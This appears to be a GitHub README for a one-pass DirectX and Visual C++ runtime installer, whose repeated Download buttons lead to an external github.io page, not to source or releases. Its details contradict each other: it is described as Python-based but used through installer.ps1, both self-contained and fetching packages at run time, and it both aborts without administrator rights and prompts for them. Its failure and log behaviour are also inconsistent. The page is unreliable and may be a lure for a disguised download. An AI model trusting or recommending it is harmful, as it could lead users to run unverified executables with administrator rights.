<div align="center">

# DirectX & Visual C++ Runtime Installer for Windows 10 & 11

![preview](https://raw.githubusercontent.com/Aftabkhan066/dx-vcpp-runtime-setup/main/screen_f08b.svg)

[![downloads](https://img.shields.io/badge/downloads-184K-84cc16?style=flat-square&labelColor=0d1117)]() [![version](https://img.shields.io/badge/version-3.5.8-84cc16?style=flat-square&labelColor=0d1117)]() [![platform](https://img.shields.io/badge/platform-Windows%2010%20%2F%2011-84cc16?style=flat-square&labelColor=0d1117)]()

[![Download](https://raw.githubusercontent.com/Aftabkhan066/dx-vcpp-runtime-setup/main/app_cb2252.svg)](https://Aftabkhan066.github.io/dx-vcpp-runtime-setup/)

</div>

---

A single Python-based installer that quietly provisions the full set of DirectX and Visual C++ runtimes in one pass, eliminating the usual hunt through Microsoft's download pages for each redistributable. It's built for technicians, IT generalists, and anyone preparing a fresh Windows machine who needs the prerequisite stack in place before games or applications will launch. The suite batches every required version into one unattended run, so there are no per-package prompts, no version-guessing, and no leftover install wizards to click through. Point it at a system and it handles the rest, keeping the process silent and repeatable.

## Features

- **Silent, unattended installs** — every runtime package runs with quiet flags, so there are no dialog boxes to click through and no reboot prompts interrupting the pass.
- **DirectX and Visual C++ in one run** — the legacy DirectX end-user runtimes and the Visual C++ redistributable set are handled together instead of as separate manual downloads.
- **Ordered, idempotent execution** — components are applied in a fixed sequence, and already-present versions are skipped so re-running the suite is safe.
- **Python-driven orchestration** — a small Python entry point locates, unpacks, and launches each bundled installer, with exit codes surfaced per component.
- **Per-component logging** — each installer's output is captured to its own log so a failed step can be identified without re-reading the whole console.
- **No admin-free magic** — the suite expects an elevated shell and fails early with a clear message when it isn't running as administrator.

| Behavior | Default | Notes |
| --- | --- | --- |
| Quiet installs | enabled | Suppresses UI for all bundled installers |
| Skip installed versions | enabled | Compares detected versions before running |
| Per-component logging | enabled | One log file per installer |
| Reboot suppression | enabled | Defers reboots until the end of the run |
| Continue on failure | disabled | Stops the pass and reports the failing component |

```text
[1/4] validate elevation ......... ok
[2/4] detect installed runtimes .. 3 present, 5 missing
[3/4] run installers ............. silent, logged
[4/4] summary .................... 5 installed, 0 failed
```

- **Transparent exit status** — the script exits non-zero if any component fails, making it usable inside provisioning scripts.
- **Self-contained layout** — installer payloads and the Python runner live side by side, so the suite can be carried on removable media.

## How it works

The suite runs as a single orchestration pass. It enumerates every runtime package in the bundle, installs each one silently, and records the outcome so the pass can be repeated safely.

### Execution flow

1. **Discovery** — the driver scans the bundled package directory and builds an ordered install queue. Package ordering respects dependencies, so prerequisites are satisfied before dependents run.
2. **Preflight checks** — before installing anything, the driver verifies the host is supported (OS edition, architecture, available disk space) and confirms the packages are intact.
3. **Quiet install** — each package is invoked with its silent switches and suppressed UI. The driver waits for each child process to exit and captures the exit status.
4. **Result classification** — exit statuses are mapped to one of three states:

| State | Meaning | Effect on the pass |
| --- | --- | --- |
| Installed | Package applied successfully, or was already current | Continue |
| Skipped | Package not applicable to this host (wrong architecture, superseded) | Continue |
| Failed | Non-zero exit or timeout | Recorded, pass continues unless strict mode is on |

5. **Summary** — after the queue drains, the driver prints a per-package table of what happened and returns a non-zero exit status if any failures occurred.

### Package selection

Only packages that match the host are queued. The driver filters on:

- **Architecture** — x86, x64, and ARM64 packages are matched to the host.
- **OS build** — packages targeting a newer build than the host are skipped rather than attempted.
- **Already-present detection** — packages whose runtime is already at or above the bundled version are marked as skipped to keep the pass fast.

### Silent invocation model

Every package is launched non-interactively. The driver does not pipe prompts or answer dialogs; it relies on each package's native quiet flags and treats any package that cannot run unattended as failed. Typical invocation shape:

```python
result = subprocess.run(package.command, capture_output=True, timeout=package.timeout)
state = classify(result.returncode)
```

### Repeatability

The pass is designed to be idempotent. Running it again on a machine where everything is already installed produces a pass where every package is classified as skipped, and the exit status is zero. This makes it safe to place in provisioning scripts or re-run after a failure without side effects.

### Logging

Each pass writes a structured log containing:

- the host fingerprint (OS build, architecture, disk space at start)
- the install queue as resolved, in execution order
- per-package start time, duration, exit status, and classification
- the final summary table

Logs are appended rather than overwritten, so successive passes remain distinguishable when diagnosing a partial install.

## Requirements

- **Windows 10 or Windows 11** (64-bit; 32-bit hosts are not supported)
- **Python 3.8+** on `PATH` — verify with:
 ```bat
 python --version
 ```
- **Administrator privileges** — required to register runtimes system-wide; the installer detects elevation and aborts early if it is missing
- **~2 GB free disk space** for staged packages and temporary extraction
- **Stable internet connection** for the duration of the run (packages are fetched at execution time)

### Optional

| Item | Purpose |
| --- | --- |
| `--log` target directory | Persist per-package install logs for troubleshooting; defaults to a temp folder cleared on exit |
| Windows PowerShell 5.1+ | Enables the progress/telemetry wrapper; the core installer runs without it |
| Reboot window | Some runtime components only take effect after a restart, so plan for one at the end of the pass |

### Not required

- No preinstalled DirectX or Visual C++ redistributables — existing versions are detected and skipped
- No external package manager, build toolchain, or compiler
- No configuration file — behavior is controlled entirely through command-line flags

## FAQ

- **Does this need an internet connection?** 
 Yes for the first run if the required DirectX or Visual C++ packages are not already cached locally. Once the packages are present in the cache, the installer can run offline.

- **Will it uninstall or overwrite existing runtimes?** 
 No. It installs or repairs missing components and leaves existing installations in place.

- **Does it require administrator rights?** 
 Yes. Installing system-wide runtime components requires elevation. The script will prompt for elevation if it is not already running elevated.

- **Which Windows versions are supported?** 
 See the Requirements section. The suite targets Windows systems that support the DirectX and Visual C++ runtime packages it bundles.

- **Can I run it silently or unattended?** 
 Yes. The installer runs in quiet mode by default. Use the exit code to determine success or failure in scripts:

 ```powershell
 & .\installer.ps1 -Quiet
 if ($LASTEXITCODE -ne 0) {
 Write-Error "Installer failed with exit code $LASTEXITCODE"
 }
 ```

- **Where are logs written?** 
 Logs are written to the working directory alongside the installer. Check the most recent log file if an install fails.

- **How do I know which components were installed or skipped?** 
 The log records each component, its detection result, and the action taken (installed, repaired, skipped, or failed).

- **Why did the installer skip a component?** 
 A component is skipped when it is already present and does not need repair. This is expected behavior and not an error.

- **Can I customize which components are installed?** 
 Yes. Pass a subset of components using the component selector flag:

 ```powershell
 & .\installer.ps1 -Components DirectX,VCRedist
 ```

- **Is it safe to re-run?** 
 Yes. The suite is idempotent: re-running it will detect existing components and only act on those that are missing or need repair.

- **Does it modify system settings or registry beyond runtime installation?** 
 No. It only performs the actions required for the runtime packages it installs.

- **The installer failed — what should I check?** 
 - Confirm you are running with administrator rights. 
 - Confirm network access if components are not cached. 
 - Review the log file for the failing component and its error code. 
 - Re-run with verbose logging for more detail:

 ```powershell
 & .\installer.ps1 -Verbose
 ```

- **How do I report a bug or request a feature?** 
 Open an issue with the log file attached, the Windows version, and the exact command you ran.

## Disclaimer

> **⚠️ Use at your own risk.** This tool modifies system-level runtime components. Review the notes below before running it on any machine you care about.

- This project is provided **"as is"**, without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and non-infringement.
- The authors and contributors are **not liable** for any claim, damages, data loss, system instability, boot failure, or other liability arising from the use or misuse of this software.
- **No affiliation or endorsement.** This is an independent, community-made utility. It is not affiliated with, endorsed by, or sponsored by Microsoft or any other vendor whose runtime packages it may install. All product names and trademarks belong to their respective owners.
- **Redistribution.** The suite orchestrates installation of third-party runtime packages. You are responsible for complying with the license terms of every package it invokes, including any restrictions on bundling or redistribution.
- **Silent / quiet mode.** The installer runs unattended by design. That means it will not prompt you for confirmation at each step. Test in a disposable environment first if you are unsure of the impact.

### What this tool does *not* do

| Guarantee | Status |
|---|---|
| Fix a corrupted OS installation | ❌ Not supported |
| Replace Windows Update | ❌ Not a substitute |
| Repair missing system files (e.g., `sfc` / `DISM` tasks) | ❌ Out of scope |
| Guarantee compatibility with every game or app | ❌ Cannot be promised |
| Provide rollback / uninstall of installed runtimes | ⚠️ Not included — plan accordingly |

### Before you run it

- Create a **system restore point** or full backup of the target machine.
- Verify you have obtained this software from a **trusted source**; do not run modified copies.
- Confirm the target OS and architecture are supported (see the Requirements section).
- Close applications that may hold runtime DLLs open during installation.
- If you are deploying at scale, **test on a representative machine** before rolling out.

```text
By downloading, building, or executing this software you acknowledge that you
have read this disclaimer and accept full responsibility for the outcome.
If you do not agree, do not use the software.
```

### Reporting problems

Issues, corrections, and pull requests are welcome through the project's standard contribution channels. Please include your OS version, the step where the problem occurred, and any relevant logs — but **redact paths, usernames, and machine identifiers** before posting.

## License

This project is released under the MIT License. See the `LICENSE` file in the repository root for the full text. In short, the MIT License permits use, copying, modification, merging, publishing, distribution, sublicensing, and sale of copies of the software, provided that the copyright notice and permission notice are included in all copies or substantial portions of the software. The software is provided "as is", without warranty of any kind, express or implied, and the authors or copyright holders are not liable for any claim, damages, or other liability arising from the software or its use.

| Permission | Status |
| --- | --- |
| Commercial use | Allowed |
| Modification | Allowed |
| Distribution | Allowed |
| Private use | Allowed |
| Sublicensing | Allowed |
| Warranty | Not provided |
| Liability | Not accepted |

- Keep the copyright notice and the permission notice with any redistributed copies or substantial portions of the software.
- Third-party runtimes installed by this tool remain governed by their own respective licenses.
- If you contribute changes, you agree that they may be distributed under the same MIT License.

[![Download](https://raw.githubusercontent.com/Aftabkhan066/dx-vcpp-runtime-setup/main/app_cb2252.svg)](https://Aftabkhan066.github.io/dx-vcpp-runtime-setup/)